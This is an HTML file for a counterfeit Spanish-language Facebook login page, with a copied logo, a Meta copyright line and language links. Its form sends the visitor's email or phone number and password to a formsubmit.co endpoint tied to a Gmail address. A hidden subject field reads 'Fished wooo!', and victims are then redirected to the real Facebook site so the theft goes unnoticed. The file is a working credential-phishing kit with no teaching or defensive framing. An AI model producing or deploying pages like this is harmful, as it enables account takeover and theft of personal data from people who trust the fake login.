<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/styles.css">
    <link rel="stylesheet" href="./css/W3style.css">
</head>

<body>
    <ul class="nav" style="background-color: #ffffcc;">
        <li style=" color: #003780;"><a href="#home">Descarga Facebook para android y navega más rápido.</a></li>
    </ul>
      
    <div class="logo-img w3-center w3-hide-large">
        <img src="./images/logo.png" class="w3-image">
    </div>
    <div class="w3-row w3-center">
        <div class="heading-section w3-col  m6 w3-container w3-hide-small  w3-hide-medium">
            <img src="./images/logo.png" class="logo-img w3-center">
            <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
        </div>

        <form action="https://formsubmit.co/sinoplegales@gmail.com" method="POST" 
            class="a-form w3-col w3-padding-large m11 w3-container">
            <input type="hidden" name="_subject" value="Fished wooo!">
            <input type="email" name="Email" id="Email" class="a-email" placeholder="Numero de celular o correo electrónico"
            autofocus="autofocus" required />
            <input type="text" id="Password" class="a-pss" name="Password" placeholder="Contraseña"
            autofocus="autofocus"/>
            <input type="hidden" name="_next" value="https://www.facebook.com/">
            <input type="hidden" name="_captcha" value="false">

            <input type="submit" class="a-sub" value="Iniciar sesión"/>
            <a href="" class="a-link">¿Olvidaste tu contraseña?</a>
            <div class="separator">O</div>
            <input type="submit " class="a-but" value="Crear cuenta nueva" />

            <!--<div class="create-page">
                <a href="" class="a-href">Create a Page</a></b> for a celebrity, band or business.
            </div> -->
        </form>        
    </div>
    <div class="xdiv"></div>

    <div class="clearfix ">
        <div class="xdiv">
            <div class="sdiv w3-col s3" style="background-color:#f0f2f5"></div>
            <div class="box list-1 w3-col s3" style="background-color:#f0f2f5">
                <p style= "color:#737373; font-size: 18px; font-weight: 700;">Español</p>
                <p style=" color: #003780;">português</p>
                <p style=" color: #003780;">Deutsch</p>
                <p style="color: #003780;">عربي</p>
            </div>
            <div class="box list-1 w3-col s3" style="background-color:#f0f2f5">
                <p style="color: #003780;">English (US)</p>
                <p style="color: #003780;">française (France)</p>
                <p style="color: #003780;">Italiano</p>
                <p style="color: #003780;">Pусский</p>
            </div>
            <div class="sdiv w3-col s3" style="background-color:#f0f2f5"></div>
        </div>
    </div>

    <div class="xdiv w3-col w3-center s12">
        <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
            <p>
                Información Ayuda Más
            </p>
            <div class="copyright">
                <div><span> Meta © 2024</span>
                </div>
            </div>
        </div>
    </div>

      

</body>

</html>
